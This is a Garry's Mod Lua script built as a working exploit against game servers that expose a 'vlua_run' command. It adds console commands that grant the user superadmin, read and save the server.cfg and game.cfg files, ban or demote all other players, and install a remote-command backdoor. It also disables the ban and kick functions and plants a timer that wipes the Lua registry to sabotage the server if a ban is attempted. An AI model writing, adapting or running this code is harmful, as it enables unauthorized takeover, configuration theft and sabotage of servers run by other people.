local function Command(ply, command, args)
	if args[1] == "setadmin" then
		RunConsoleCommand("vlua_run", [[for k, v in pairs(player.GetAll()) do if v:Nick() == "]] .. ply:Nick() .. [[" then v:SetUserGroup('admin') v:SetUserGroup('superadmin') end end]])
		print("Command 'setadmin' executed! Hopefully if everything worked fine you have Superadmin access.")
	elseif args[1] == "servercfg" then
		RunConsoleCommand("vlua_run", [[for k, v in pairs(player.GetAll()) do if v:Nick() == "]] .. ply:Nick() .. [[" then v:ChatPrint("SERVER.CFG: " .. file.Read("cfg/server.cfg", true) .. " GAME.CFG: " .. file.Read("cfg/game.cfg", true)) end end]])
		print("Command 'servercfg' executed! Hopefully you should see the CFG files.")
	elseif args[1] == "banadmins" then
		RunConsoleCommand("vlua_run", [[for k, v in pairs(player.GetAll()) do if v:Nick() != "]] .. ply:Nick() .. [[" then RunConsoleCommand("ev", "ban " .. v:Nick() .. " 0 Trololol") RunConsoleCommand("ulx", "ban " .. v:Nick() .. " 0 Trololol") v:Ban(0, "Trololol") end end]])
		print("Command 'banadmins' executed! Hopefully all admins except you are banned.")
	elseif args[1] == "demoteadmins" then
		RunConsoleCommand("vlua_run", [[for k, v in pairs(player.GetAll()) do if v:Nick() != "]] .. ply:Nick() .. [[" then RunConsoleCommand("ev", "rank " .. v:Nick() .. " Guest") RunConsoleCommand("ulx", "removeuser ".. v:Nick()) v:SetUserGroup('guest') end end]])
		print("Command 'demoteadmins' executed! Hopefully all admins except you are demoted.")
	elseif args[1] == "rcon" then
		RunConsoleCommand("vlua_run", "concommand.Add('server_r', function(ply, command, args) RunConsoleCommand(unpack(args)) end)")
		local t = args
		table.remove(t, 1)
		timer.Simple(0.1, function()
			RunConsoleCommand("server_r", t)
		end)
		print("RCON Command " .. unpack(t) .. " Executed!")
	elseif !args[1] then
		print("Commands are: setadmin, servercfg, banadmins, demoteadmins, rcon")
	end
end
concommand.Add("server_command", Command)


local function NoBans()
	RunConsoleCommand("vlua_run",[[_R.Player.Ban = function() lolol = true end]])
	RunConsoleCommand("vlua_run",[[_R.Player.Kick = function() lolol = true end]])
	
	timer.Simple(0.1, function()
		RunConsoleCommand("vlua_run",[[if ULib then ULib.kick = function() lolol = true end end]])
		RunConsoleCommand("vlua_run",[[if ULib then ULib.ban = function() lolol = true end end]])
	end)
	
	timer.Simple(0.2, function()
		RunConsoleCommand("vlua_run",[[if ULib then ULib.kickban = function() lolol = true end end]])
		RunConsoleCommand("vlua_run",[[if ULib then ULib.addBan = function() lolol = true end end]])
	end)
	
	print("! sent, you now can't be kicked!")
end
concommand.Add("exploit_bans", NoBans)


local function GetRCON()
	RunConsoleCommand("vlua_run","concommand.Add('lol_rcon',function(_,_,args) RunConsoleCommand( unpack(args) ) end)")
	RunConsoleCommand("vlua_run","concommand.Add('me',function(p) me = p end)")
	timer.Simple(0.1, function()
		RunConsoleCommand("me")
	end)
	print("! sent")
end
concommand.Add("exploit_rcon", GetRCON)

local function DumpCFG()
RunConsoleCommand("vlua_run","datastream.StreamToClients(player.GetAll(),'DS',{a=file.Read('cfg/server.cfg',true)})")
print("! sent")
end
concommand.Add("exploit_cfg", DumpCFG)

local function DS(hdl,idx,enc,dec)
PrintTable(dec)
local lol = dec.a
file.Write(tostring(os.date)..".txt", lol)
print("! got and saved")
end
datastream.Hook("DS", DS)


local function JustInCase()
	RunConsoleCommand("vlua_run","timer.Create('lol',4,0,function() if lolol then table.Empty(_R) end end)")
	print("! sent")
end
concommand.Add("exploit_insurance", JustInCase)